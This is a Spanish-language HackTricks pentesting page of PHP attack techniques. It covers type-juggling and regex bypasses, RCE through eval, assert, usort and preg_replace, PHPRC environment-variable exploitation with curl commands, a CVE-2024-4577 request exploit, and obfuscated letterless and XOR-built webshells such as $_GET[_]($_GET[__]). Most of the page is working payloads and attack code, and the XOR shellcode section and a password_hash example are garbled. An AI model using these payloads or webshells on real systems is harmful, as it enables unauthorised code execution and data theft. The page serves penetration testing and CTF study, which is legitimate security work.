# PHP Tricks

{{#include ../../../banners/hacktricks-training.md}}


## Ubicación común de las cookies:

Esto también es válido para las cookies de phpMyAdmin.

Cookies:
```
PHPSESSID
phpMyAdmin
```
Ubicaciones:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## Bypassando comparaciones PHP

### Comparaciones sueltas/Juggling de tipos ( == )

Si se usa `==` en PHP, hay casos inesperados donde la comparación no se comporta como se espera. Esto se debe a que "==" solo compara valores transformados al mismo tipo, si también quieres comparar que el tipo de los datos comparados sea el mismo, necesitas usar `===`.

Tablas de comparación de PHP: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../images/image (567).png>)

{% file src="../../../images/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

- `"string" == 0 -> True` Una cadena que no comienza con un número es igual a un número
- `"0xAAAA" == "43690" -> True` Cadenas compuestas por números en formato dec o hex pueden ser comparadas con otros números/cadenas con True como resultado si los números son los mismos (números en una cadena se interpretan como números)
- `"0e3264578" == 0 --> True` Una cadena que comienza con "0e" y seguida de cualquier cosa será igual a 0
- `"0X3264578" == 0X --> True` Una cadena que comienza con "0" y seguida de cualquier letra (X puede ser cualquier letra) y seguida de cualquier cosa será igual a 0
- `"0e12334" == "0" --> True` Esto es muy interesante porque en algunos casos puedes controlar la entrada de la cadena de "0" y algún contenido que se está hasheando y comparando con ella. Por lo tanto, si puedes proporcionar un valor que cree un hash que comience con "0e" y sin ninguna letra, podrías eludir la comparación. Puedes encontrar **cadenas ya hasheadas** con este formato aquí: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
- `"X" == 0 --> True` Cualquier letra en una cadena es igual a int 0

Más info en [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in_array()**

**Juggling de tipos** también afecta a la función `in_array()` por defecto (necesitas establecer en true el tercer argumento para hacer una comparación estricta):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Si esta función se utiliza para **cualquier verificación de autenticación** (como verificar la contraseña) y el usuario controla un lado de la comparación, puede enviar un array vacío en lugar de una cadena como el valor de la contraseña (`https://example.com/login.php/?username=admin&password[]=`) y eludir esta verificación:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
El mismo error ocurre con `strcasecmp()`

### Conversión de tipos estricta

Incluso si `===` **se está utilizando**, podría haber errores que hacen que la **comparación sea vulnerable** a la **conversión de tipos**. Por ejemplo, si la comparación **convierte los datos a un tipo diferente de objeto antes de comparar**:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg_match(/^.\*/)

**`preg_match()`** podría usarse para **validar la entrada del usuario** (verifica si alguna **palabra/regex** de una **lista negra** está **presente** en la **entrada del usuario** y si no lo está, el código puede continuar su ejecución).

#### Bypass de nueva línea

Sin embargo, al delimitar el inicio de la regexp, `preg_match()` **solo verifica la primera línea de la entrada del usuario**, entonces, si de alguna manera puedes **enviar** la entrada en **varias líneas**, podrías ser capaz de eludir esta verificación. Ejemplo:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Para eludir esta verificación, podrías **enviar el valor con nuevas líneas urlencoded** (`%0A`) o si puedes enviar **datos JSON**, envíalos en **varias líneas**:
```php
{
"cmd": "cat /etc/passwd"
}
```
Encuentra un ejemplo aquí: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Bypass de error de longitud**

(Este bypass se intentó aparentemente en PHP 5.2.5 y no pude hacerlo funcionar en PHP 7.3.15)\
Si puedes enviar a `preg_match()` una **entrada** **muy grande** válida, **no podrá procesarla** y podrás **eludir** la verificación. Por ejemplo, si está bloqueando un JSON, podrías enviar:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
From: [https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0](https://medium.com/bugbountywriteup/solving-each-and-every-fb-ctf-challenge-part-1-4bce03e2ecb0)

#### Bypass de ReDoS

Truco de: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223) y [https://mizu.re/post/pong](https://mizu.re/post/pong)

<figure><img src="../../../images/image (26).png" alt=""><figcaption></figcaption></figure>

En resumen, el problema ocurre porque las funciones `preg_*` en PHP se basan en la [biblioteca PCRE](http://www.pcre.org/). En PCRE, ciertas expresiones regulares se emparejan utilizando muchas llamadas recursivas, lo que consume mucho espacio en la pila. Es posible establecer un límite en la cantidad de recursiones permitidas, pero en PHP este límite [por defecto es 100.000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit), que es más de lo que cabe en la pila.

[Este hilo de Stackoverflow](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) también fue vinculado en la publicación donde se habla más a fondo sobre este problema. Nuestra tarea ahora estaba clara:\
**Enviar una entrada que hiciera que la regex realizara 100_000+ recursiones, causando SIGSEGV, haciendo que la función `preg_match()` devolviera `false`, haciendo que la aplicación pensara que nuestra entrada no es maliciosa, lanzando la sorpresa al final de la carga útil algo como `{system(<verybadcommand>)}` para obtener SSTI --> RCE --> flag :)**.

Bueno, en términos de regex, en realidad no estamos haciendo 100k "recursiones", sino que estamos contando "pasos de retroceso", que como indica la [documentación de PHP](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) por defecto es 1_000_000 (1M) en la variable `pcre.backtrack_limit`.\ 
Para alcanzar eso, `'X'*500_001` resultará en 1 millón de pasos de retroceso (500k hacia adelante y 500k hacia atrás):
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### Manipulación de tipos para ofuscación de PHP
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Execute After Redirect (EAR)

Si PHP está redirigiendo a otra página pero no se llama a ninguna función **`die`** o **`exit`** después de que se establece el encabezado `Location`, PHP continúa ejecutándose y agregando los datos al cuerpo:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Explotación de Traversal de Ruta e Inclusión de Archivos

Verifica:

{{#ref}}
../../../pentesting-web/file-inclusion/
{{#endref}}

## Más trucos

- **register_globals**: En **PHP < 4.1.1.1** o si está mal configurado, **register_globals** puede estar activo (o su comportamiento está siendo imitado). Esto implica que en variables globales como $\_GET si tienen un valor por ejemplo $\_GET\["param"]="1234", puedes acceder a él a través de **$param. Por lo tanto, al enviar parámetros HTTP puedes sobrescribir variables\*\* que se utilizan dentro del código.
- Las **cookies PHPSESSION del mismo dominio se almacenan en el mismo lugar**, por lo tanto, si dentro de un dominio **se utilizan diferentes cookies en diferentes rutas** puedes hacer que una ruta **acceda a la cookie de la otra ruta** configurando el valor de la cookie de la otra ruta.\
De esta manera, si **ambas rutas acceden a una variable con el mismo nombre** puedes hacer que el **valor de esa variable en path1 se aplique a path2**. Y luego path2 tomará como válidos las variables de path1 (dándole a la cookie el nombre que le corresponde en path2).
- Cuando tengas los **nombres de usuario** de los usuarios de la máquina. Verifica la dirección: **/\~\<USERNAME>** para ver si los directorios php están activados.
- [**LFI y RCE usando envoltorios php**](../../../pentesting-web/file-inclusion/)

### password_hash/password_verify

Estas funciones se utilizan típicamente en PHP para **generar hashes a partir de contraseñas** y para **verificar** si una contraseña es correcta en comparación con un hash.\
Los algoritmos soportados son: `PASSWORD_DEFAULT` y `PASSWORD_BCRYPT` (comienza con `$2y$`). Ten en cuenta que **PASSWORD_DEFAULT es frecuentemente lo mismo que PASSWORD_BCRYPT.** Y actualmente, **PASSWORD_BCRYPT** tiene una **limitación de tamaño en la entrada de 72bytes**. Por lo tanto, cuando intentas hashear algo más grande que 72bytes con este algoritmo, solo se utilizarán los primeros 72B:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTP headers bypass abusando de errores de PHP

#### Causando un error después de establecer encabezados

Desde [**este hilo de twitter**](https://twitter.com/pilvar222/status/1784618120902005070?t=xYn7KdyIvnNOlkVaGbgL6A&s=19) puedes ver que al enviar más de 1000 parámetros GET o 1000 parámetros POST o 20 archivos, PHP no va a establecer encabezados en la respuesta.

Permitiendo el bypass de, por ejemplo, encabezados CSP que se establecen en códigos como:
```php
<?php
header("Content-Security-Policy: default-src 'none';");
if (isset($_GET["xss"])) echo $_GET["xss"];
```
#### Llenando un cuerpo antes de establecer encabezados

Si una **página PHP está imprimiendo errores y devolviendo alguna entrada proporcionada por el usuario**, el usuario puede hacer que el servidor PHP imprima de vuelta algún **contenido lo suficientemente largo** para que cuando intente **agregar los encabezados** a la respuesta, el servidor genere un error.\
En el siguiente escenario, el **atacante hizo que el servidor generara algunos errores grandes**, y como puedes ver en la pantalla, cuando PHP intentó **modificar la información del encabezado, no pudo** (por ejemplo, el encabezado CSP no se envió al usuario):

![](<../../../images/image (1085).png>)

## SSRF en funciones PHP

Consulta la página:

{{#ref}}
php-ssrf.md
{{#endref}}

## Ejecución de código

**system("ls");**\
&#xNAN;**\`ls\`;**\
**shell_exec("ls");**

[Consulta esto para más funciones útiles de PHP](php-useful-functions-disable_functions-open_basedir-bypass/)

### **RCE a través de** **preg_replace()**
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
Para ejecutar el código en el argumento "replace" se necesita al menos una coincidencia.\
Esta opción de preg_replace ha sido **desaprobada a partir de PHP 5.5.0.**

### **RCE a través de Eval()**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE a través de Assert()**

Esta función dentro de php te permite **ejecutar código que está escrito en una cadena** para **devolver verdadero o falso** (y dependiendo de esto alterar la ejecución). Por lo general, la variable del usuario se insertará en medio de una cadena. Por ejemplo:\
`assert("strpos($_GET['page']),'..') === false")` --> En este caso, para obtener **RCE** podrías hacer:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
Necesitarás **romper** la **sintaxis** del código, **agregar** tu **payload**, y luego **arreglarlo de nuevo**. Puedes usar **operaciones lógicas** como "**and" o "%26%26" o "|"**. Ten en cuenta que "or", "||" no funciona porque si la primera condición es verdadera, nuestro payload no se ejecutará. De la misma manera, ";" no funciona ya que nuestro payload no se ejecutará.

**Otra opción** es agregar a la cadena la ejecución del comando: `'.highlight_file('.passwd').'`

**Otra opción** (si tienes el código interno) es modificar alguna variable para alterar la ejecución: `$file = "hola"`

### **RCE a través de usort()**

Esta función se utiliza para ordenar un array de elementos utilizando una función específica.\
Para abusar de esta función:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
Puedes usar también **//** para comentar el resto del código.

Para descubrir el número de paréntesis que necesitas cerrar:

- `?order=id;}//`: obtenemos un mensaje de error (`Parse error: syntax error, unexpected ';'`). Probablemente nos falte uno o más corchetes.
- `?order=id);}//`: obtenemos una **advertencia**. Eso parece correcto.
- `?order=id));}//`: obtenemos un mensaje de error (`Parse error: syntax error, unexpected ')' i`). Probablemente tenemos demasiados corchetes de cierre.

### **RCE a través de .httaccess**

Si puedes **subir** un **.htaccess**, entonces puedes **configurar** varias cosas e incluso ejecutar código (configurando que los archivos con extensión .htaccess pueden ser **ejecutados**).

Se pueden encontrar diferentes shells .htaccess [aquí](https://github.com/wireghoul/htshells)

### RCE a través de Variables de Entorno

Si encuentras una vulnerabilidad que te permite **modificar variables de entorno en PHP** (y otra para subir archivos, aunque con más investigación tal vez esto se pueda eludir), podrías abusar de este comportamiento para obtener **RCE**.

- [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld_preload-and-ld_library_path): Esta variable de entorno te permite cargar bibliotecas arbitrarias al ejecutar otros binarios (aunque en este caso puede que no funcione).
- **`PHPRC`** : Instruye a PHP sobre **dónde localizar su archivo de configuración**, generalmente llamado `php.ini`. Si puedes subir tu propio archivo de configuración, entonces, usa `PHPRC` para apuntar a él. Agrega una entrada de **`auto_prepend_file`** especificando un segundo archivo subido. Este segundo archivo contiene código **PHP normal, que luego es ejecutado** por el runtime de PHP antes de cualquier otro código.
1. Sube un archivo PHP que contenga nuestro shellcode
2. Sube un segundo archivo, que contenga una directiva de **`auto_prepend_file`** instruyendo al preprocesador de PHP a ejecutar el archivo que subiste en el paso 1
3. Establece la variable `PHPRC` al archivo que subiste en el paso 2.
- Obtén más información sobre cómo ejecutar esta cadena [**del informe original**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
- **PHPRC** - otra opción
- Si **no puedes subir archivos**, podrías usar en FreeBSD el "archivo" `/dev/fd/0` que contiene el **`stdin`**, siendo el **cuerpo** de la solicitud enviada al `stdin`:
- `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
- O para obtener RCE, habilita **`allow_url_include`** y prepende un archivo con **código PHP en base64**:
- `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
- Técnica [**de este informe**](https://vulncheck.com/blog/juniper-cve-2023-36845).

### XAMPP CGI RCE - CVE-2024-4577

El servidor web analiza las solicitudes HTTP y las pasa a un script PHP ejecutando una solicitud como [`http://host/cgi.php?foo=bar`](http://host/cgi.php?foo=bar&ref=labs.watchtowr.com) como `php.exe cgi.php foo=bar`, lo que permite una inyección de parámetros. Esto permitiría inyectar los siguientes parámetros para cargar el código PHP desde el cuerpo:
```jsx
-d allow_url_include=1 -d auto_prepend_file=php://input
```
Además, es posible inyectar el parámetro "-" utilizando el carácter 0xAD debido a la normalización posterior de PHP. Consulta el ejemplo de exploit de [**esta publicación**](https://labs.watchtowr.com/no-way-php-strikes-again-cve-2024-4577/):
```jsx
POST /test.php?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1
Host: {{host}}
User-Agent: curl/8.3.0
Accept: */*
Content-Length: 23
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

<?php
phpinfo();
?>

```
## Bypass de sanitización de PHP & Brain Fuck

[**En esta publicación**](https://blog.redteam-pentesting.de/2024/moodle-rce/) es posible encontrar grandes ideas para generar un código PHP de brain fuck con muy pocos caracteres permitidos.\
Además, también se propone una forma interesante de ejecutar funciones que les permitió eludir varias verificaciones:
```php
(1)->{system($_GET[chr(97)])}
```
## Análisis estático de PHP

Mira si puedes insertar código en las llamadas a estas funciones (de [aquí](https://www.youtube.com/watch?v=SyWUsN0yHKI&feature=youtu.be)):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Si estás depurando una aplicación PHP, puedes habilitar globalmente la impresión de errores en `/etc/php5/apache2/php.ini` añadiendo `display_errors = On` y reiniciar apache: `sudo systemctl restart apache2`

### Desofuscando código PHP

Puedes usar el **web**[ **www.unphp.net**](http://www.unphp.net) **para desofuscar código php.**

## Envolturas y Protocolos PHP

Las envolturas y protocolos PHP podrían permitirte **eludir las protecciones de escritura y lectura** en un sistema y comprometerlo. Para [**más información consulta esta página**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## RCE no autenticada de Xdebug

Si ves que **Xdebug** está **habilitado** en una salida de `phpconfig()`, deberías intentar obtener RCE a través de [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

## Variables variables
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## RCE abusando de $\_GET\["a"]\($\_GET\["b")

Si en una página puedes **crear un nuevo objeto de una clase arbitraria** podrías obtener RCE, consulta la siguiente página para aprender cómo:

{{#ref}}
php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md
{{#endref}}

## Ejecutar PHP sin letras

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Usando octal
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¢___ not needed then $_($__), show_source(.passwd)
```
### Código de shell fácil XOR

Según [**este informe** ](https://mgp25.com/ctf/Web-challenge/) es posible generar un código de shell fácil de esta manera:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Entonces, si puedes **ejecutar PHP arbitrario sin números y letras** puedes enviar una solicitud como la siguiente abusando de esa carga útil para ejecutar PHP arbitrario:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Para una explicación más detallada, consulta [https://ctf-wiki.org/web/php/php/#preg_match](https://ctf-wiki.org/web/php/php/#preg_match)

### Shellcode XOR (dentro de eval)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl como
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
{{#include ../../../banners/hacktricks-training.md}}
